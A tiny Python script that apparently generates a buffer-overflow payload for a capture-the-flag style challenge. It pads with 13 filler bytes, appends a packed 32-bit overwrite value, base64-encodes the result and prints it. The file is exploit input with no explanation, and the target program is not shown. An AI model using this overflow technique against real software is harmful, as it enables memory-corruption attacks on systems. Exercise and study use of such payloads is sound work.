
import sys
import struct
import base64

buf = b'UUUUUUUUUUUUU'
buf += struct.pack('<I', 3998371883)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
